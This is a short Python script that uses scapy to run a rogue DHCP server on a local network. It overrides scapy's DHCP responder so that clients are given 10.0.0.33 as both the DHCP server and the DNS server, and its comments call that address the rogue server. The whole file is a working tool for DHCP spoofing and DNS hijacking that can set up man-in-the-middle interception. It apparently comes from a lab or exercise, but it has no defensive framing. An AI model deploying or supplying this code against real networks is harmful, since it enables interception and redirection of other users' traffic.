from scapy.all import *
from scapy.base_classes import Net

#Changing dhcp options by updating DHCP_am class from scapy module
class DHCP_am(DHCP_am):
    function_name = "dhcpd"

    def make_reply(self, req):
        resp = BOOTP_am.make_reply(self, req)
        if DHCP in req:
            dhcp_options = [(op[0], {1: 2, 3: 5}.get(op[1], op[1]))
                            for op in req[DHCP].options
                            if isinstance(op, tuple) and op[0] == "message-type"]  # noqa: E501
            dhcp_options += [("server_id", "10.0.0.33"), #updated server_id to the rogue dhcp server ip instead of the gateway
                             ("router", self.gw),
                             ("name_server", "10.0.0.33"), #updated name_server to the rogue dns server ip instead of an actual dns server
                             ("broadcast_address", self.broadcast),
                             ("subnet_mask", self.netmask),
                             ("renewal_time", self.renewal_time),
                             ("lease_time", self.lease_time),
                             "end"
                             ]
            resp /= DHCP(options=dhcp_options)
        return resp

def main():
    interface = input("Enter interface")
    dhcp_server = DHCP_am(iface='Ethernet0', pool=Net('10.0.0.128/25'), network='10.0.0.0/24', gw='10.0.0.1',renewal_time=600, lease_time=3600)
    dhcp_server()
